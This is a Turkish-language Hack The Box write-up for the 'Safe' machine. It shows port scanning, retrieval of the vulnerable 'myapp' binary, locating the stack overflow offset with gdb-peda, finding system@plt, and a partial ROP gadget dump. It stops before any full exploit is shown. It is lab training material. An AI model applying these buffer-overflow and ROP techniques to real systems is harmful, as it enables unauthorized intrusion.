---
title: "[HTB] Safe Writeup"
layout: post
---

--- 
```zsh
/opt/Safe # nmap -sS -sV -p- -A 10.10.10.147                                                                                                     
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 11:08 +03
Nmap scan report for safe.htb (10.10.10.147)
Host is up (0.067s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     04:09:35 up 21 min, 0 users, load average: 0.06, 0.01, 0.00
|   DNSVersionBindReqTCP: 
|     04:09:30 up 21 min, 0 users, load average: 0.06, 0.02, 0.00
|   GenericLines: 
|     04:09:18 up 21 min, 0 users, load average: 0.07, 0.02, 0.00
|     What do you want me to echo back?
|   GetRequest: 
|     04:09:25 up 21 min, 0 users, load average: 0.07, 0.02, 0.00
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions: 
|     04:09:25 up 21 min, 0 users, load average: 0.07, 0.02, 0.00
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help: 
|     04:09:40 up 21 min, 0 users, load average: 0.05, 0.01, 0.00
|     What do you want me to echo back? HELP
|   NULL: 
|     04:09:18 up 21 min, 0 users, load average: 0.07, 0.02, 0.00
|   RPCCheck: 
|     04:09:25 up 21 min, 0 users, load average: 0.07, 0.02, 0.00
|   RTSPRequest: 
|     04:09:25 up 21 min, 0 users, load average: 0.07, 0.02, 0.00
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq: 
|     04:09:40 up 21 min, 0 users, load average: 0.05, 0.01, 0.00
|     What do you want me to echo back?
|   TLSSessionReq, TerminalServerCookie: 
|     04:09:41 up 21 min, 0 users, load average: 0.05, 0.01, 0.00
|_    What do you want me to echo back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.80%I=7%D=10/16%Time=5DA6D03F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,3F,"\x2004:09:18\x20up\x2021\x20min,\x20\x200\x20users,\x20\x20load
SF:\x20average:\x200\.07,\x200\.02,\x200\.00\n")%r(GenericLines,64,"\x2004
SF::09:18\x20up\x2021\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x
SF:200\.07,\x200\.02,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x2
SF:0echo\x20back\?\x20\r\n")%r(GetRequest,72,"\x2004:09:25\x20up\x2021\x20
SF:min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.07,\x200\.02,\x20
SF:0\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET
SF:\x20/\x20HTTP/1\.0\r\n")%r(HTTPOptions,76,"\x2004:09:25\x20up\x2021\x20
SF:min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.07,\x200\.02,\x20
SF:0\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPT
SF:IONS\x20/\x20HTTP/1\.0\r\n")%r(RTSPRequest,76,"\x2004:09:25\x20up\x2021
SF:\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.07,\x200\.02,
SF:\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x2
SF:0OPTIONS\x20/\x20RTSP/1\.0\r\n")%r(RPCCheck,3F,"\x2004:09:25\x20up\x202
SF:1\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.07,\x200\.02
SF:,\x200\.00\n")%r(DNSVersionBindReqTCP,3F,"\x2004:09:30\x20up\x2021\x20m
SF:in,\x20\x200\x20users,\x20\x20load\x20average:\x200\.06,\x200\.02,\x200
SF:\.00\n")%r(DNSStatusRequestTCP,3F,"\x2004:09:35\x20up\x2021\x20min,\x20
SF:\x200\x20users,\x20\x20load\x20average:\x200\.06,\x200\.01,\x200\.00\n"
SF:)%r(Help,68,"\x2004:09:40\x20up\x2021\x20min,\x20\x200\x20users,\x20\x2
SF:0load\x20average:\x200\.05,\x200\.01,\x200\.00\n\nWhat\x20do\x20you\x20
SF:want\x20me\x20to\x20echo\x20back\?\x20HELP\r\n")%r(SSLSessionReq,65,"\x
SF:2004:09:40\x20up\x2021\x20min,\x20\x200\x20users,\x20\x20load\x20averag
SF:e:\x200\.05,\x200\.01,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20t
SF:o\x20echo\x20back\?\x20\x16\x03\n")%r(TerminalServerCookie,64,"\x2004:0
SF:9:41\x20up\x2021\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x20
SF:0\.05,\x200\.01,\x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20e
SF:cho\x20back\?\x20\x03\n")%r(TLSSessionReq,65,"\x2004:09:41\x20up\x2021\
SF:x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.05,\x200\.01,\
SF:x200\.00\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20
SF:\x16\x03\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/16%OT=22%CT=1%CU=32050%PV=Y%DS=2%DC=T%G=Y%TM=5DA6D0
OS:A1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=8)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   66.05 ms 10.10.14.1
2   66.06 ms safe.htb (10.10.10.147)
```
---
![alt text](http://localhost:4000/assets/myapp.png)
##### Kaynak kodda myapp isimli bir uygulamanın olduğu söyleniyor
---
---
---
```zsh
/opt/Safe #  curl -s -O 10.10.10.147/myapp
```
```zsh
/opt/Safe # readelf -a myapp | grep DEFAULT                                                                                                                                       root@0x67616e67
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.2.5 (2)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)
     5: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.2.5 (2)
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000004002a8     0 SECTION LOCAL  DEFAULT    1 
     2: 00000000004002c4     0 SECTION LOCAL  DEFAULT    2 
     3: 00000000004002e4     0 SECTION LOCAL  DEFAULT    3 
     4: 0000000000400308     0 SECTION LOCAL  DEFAULT    4 
     5: 0000000000400328     0 SECTION LOCAL  DEFAULT    5 
     6: 00000000004003d0     0 SECTION LOCAL  DEFAULT    6 
     7: 0000000000400420     0 SECTION LOCAL  DEFAULT    7 
     8: 0000000000400430     0 SECTION LOCAL  DEFAULT    8 
     9: 0000000000400450     0 SECTION LOCAL  DEFAULT    9 
    10: 0000000000400480     0 SECTION LOCAL  DEFAULT   10 
    11: 0000000000401000     0 SECTION LOCAL  DEFAULT   11 
    12: 0000000000401020     0 SECTION LOCAL  DEFAULT   12 
    13: 0000000000401070     0 SECTION LOCAL  DEFAULT   13 
    14: 0000000000401214     0 SECTION LOCAL  DEFAULT   14 
    15: 0000000000402000     0 SECTION LOCAL  DEFAULT   15 
    16: 000000000040203c     0 SECTION LOCAL  DEFAULT   16 
    17: 0000000000402080     0 SECTION LOCAL  DEFAULT   17 
    18: 0000000000403e10     0 SECTION LOCAL  DEFAULT   18 
    19: 0000000000403e18     0 SECTION LOCAL  DEFAULT   19 
    20: 0000000000403e20     0 SECTION LOCAL  DEFAULT   20 
    21: 0000000000403ff0     0 SECTION LOCAL  DEFAULT   21 
    22: 0000000000404000     0 SECTION LOCAL  DEFAULT   22 
    23: 0000000000404038     0 SECTION LOCAL  DEFAULT   23 
    24: 0000000000404048     0 SECTION LOCAL  DEFAULT   24 
    25: 0000000000000000     0 SECTION LOCAL  DEFAULT   25 
    26: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    27: 00000000004010b0     0 FUNC    LOCAL  DEFAULT   13 deregister_tm_clones
    28: 00000000004010e0     0 FUNC    LOCAL  DEFAULT   13 register_tm_clones
    29: 0000000000401120     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    30: 0000000000404048     1 OBJECT  LOCAL  DEFAULT   24 completed.7325
    31: 0000000000403e18     0 OBJECT  LOCAL  DEFAULT   19 __do_global_dtors_aux_fin
    32: 0000000000401150     0 FUNC    LOCAL  DEFAULT   13 frame_dummy
    33: 0000000000403e10     0 OBJECT  LOCAL  DEFAULT   18 __frame_dummy_init_array_
    34: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS example1.c
    35: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    36: 000000000040219c     0 OBJECT  LOCAL  DEFAULT   17 __FRAME_END__
    37: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS 
    38: 0000000000403e18     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_end
    39: 0000000000403e20     0 OBJECT  LOCAL  DEFAULT   20 _DYNAMIC
    40: 0000000000403e10     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_start
    41: 000000000040203c     0 NOTYPE  LOCAL  DEFAULT   16 __GNU_EH_FRAME_HDR
    42: 0000000000404000     0 OBJECT  LOCAL  DEFAULT   22 _GLOBAL_OFFSET_TABLE_
    43: 0000000000401210     1 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
    44: 0000000000404038     0 NOTYPE  WEAK   DEFAULT   23 data_start
    45: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
    46: 0000000000404048     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.2.5
    49: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@@GLIBC_2.2.5
    50: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    51: 0000000000404038     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
    52: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    54: 0000000000402000     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@@GLIBC_2.2.5
    56: 00000000004011b0    93 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    57: 0000000000404050     0 NOTYPE  GLOBAL DEFAULT   24 _end
    59: 0000000000401070    43 FUNC    GLOBAL DEFAULT   13 _start
    60: 0000000000404048     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start
    61: 000000000040115f    78 FUNC    GLOBAL DEFAULT   13 main
    64: 0000000000401152    13 FUNC    GLOBAL DEFAULT   13 test
```
##### Kaynak kod tarafında main() ve test() fonksiyonları tanımlı 
```zsh
/opt/Safe # python -c 'print "A"*1024' | ./myapp                                                                                                                                  
 12:24:01 up  3:53,  1 user,  load average: 0.59, 0.91, 1.20
What do you want me to echo back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[1]    18433 done                python -c 'print "A"*1024' | 
       18434 segmentation fault  ./myapp
```
```zsh
/opt/Safe # gdb myapp
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
##### NX aktif durumda olduğu için rop chain saldırısı yapabilmek adına öncelikle DEP bypass yapılması gerekir.
##### gdb-peda multithread uygulamaları çalıştırırken fork tarafında soru çıkarttığı için <code><i>set follow-fork-mode parent</i></code> yazmakta fayda var.
```zsh
gdb-peda$ set follow-fork-mode parent
```
##### pattern_create 1024 ile 1024 karakterlik random array üretiyoruz. Sonrasında stacki taştırıp, hangi offsetten taştığına bakacağız. Böylelikle kaynak kodda bufferin kaç karakter tanımlı olduğunu öğreneceğiz.
```zsh
gdb-peda$ pattern_create 1024
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC'
gdb-peda$ r
Starting program: /opt/Safe/myapp 
[Detaching after vfork from child process 19211]
 12:48:22 up  4:17,  1 user,  load average: 1.86, 1.49, 1.37

What do you want me to echo back? 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC'
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnC'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ed7924 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7ffff7fa8580 --> 0x0 
RSI: 0x405260 ("C'\nA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAy"...)
RDI: 0x0 
RBP: 0x414e414138414169 ('iAA8AANA')
RSP: 0x7fffffffe0e8 ("AjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%N"...)
RIP: 0x4011ac (<main+77>:	ret)
R8 : 0x403 
R9 : 0x7ffff7fad500 (0x00007ffff7fad500)
R10: 0x4003e0 --> 0x6972700073747570 ('puts')
R11: 0x246 
R12: 0x401070 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe1c0 ("%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsP"...)
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1 <main+66>:	call   0x401030 <puts@plt>
   0x4011a6 <main+71>:	mov    eax,0x0
   0x4011ab <main+76>:	leave  
=> 0x4011ac <main+77>:	ret    
   0x4011ad:	nop    DWORD PTR [rax]
   0x4011b0 <__libc_csu_init>:	push   r15
   0x4011b2 <__libc_csu_init+2>:	mov    r15,rdx
   0x4011b5 <__libc_csu_init+5>:	push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe0e8 ("AjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%N"...)
0008| 0x7fffffffe0f0 ("AAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%"...)
0016| 0x7fffffffe0f8 ("lAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA"...)
0024| 0x7fffffffe100 ("ARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%m"...)
0032| 0x7fffffffe108 ("AApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%"...)
0040| 0x7fffffffe110 ("qAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA"...)
0048| 0x7fffffffe118 ("AVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%r"...)
0056| 0x7fffffffe120 ("AAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac in main ()
```
```zsh
gdb-peda$ x/xg $rsp
0x7fffffffe0e8:	0x4f41413941416a41
gdb-peda$ pattern_offset 0x4f41413941416a41
5710917516646246977 found at offset: 119
```
##### systemin offsetini doğrudan alıyoruz.  0x401040
```zsh
/opt/Safe # objdump -d myapp -M intel | grep plt                                                                                                                                  
Disassembly of section .plt:
0000000000401020 <.plt>:
0000000000401030 <puts@plt>:
  40103b:	e9 e0 ff ff ff       	jmp    401020 <.plt>
0000000000401040 <system@plt>:
  40104b:	e9 d0 ff ff ff       	jmp    401020 <.plt>
0000000000401050 <printf@plt>:
  40105b:	e9 c0 ff ff ff       	jmp    401020 <.plt>
0000000000401060 <gets@plt>:
  40106b:	e9 b0 ff ff ff       	jmp    401020 <.plt>
  40116e:	e8 cd fe ff ff       	call   401040 <system@plt>
  40117f:	e8 cc fe ff ff       	call   401050 <printf@plt>
  401195:	e8 c6 fe ff ff       	call   401060 <gets@plt>
  4011a1:	e8 8a fe ff ff       	call   401030 <puts@plt>
```
##### ropper ile binary içerisindeki rop gadgetları dump ediyoruz
```zsh
/opt/Safe # ropper -f myapp                                                                                                                                                       root@0x67616e67
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x0000000000401091: adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040108a: adc dword ptr [rax], eax; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004010fe: adc dword ptr [rax], edi; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; 
0x0000000000401095: adc eax, 0x2f56; hlt; nop dword ptr [rax + rax]; ret; 
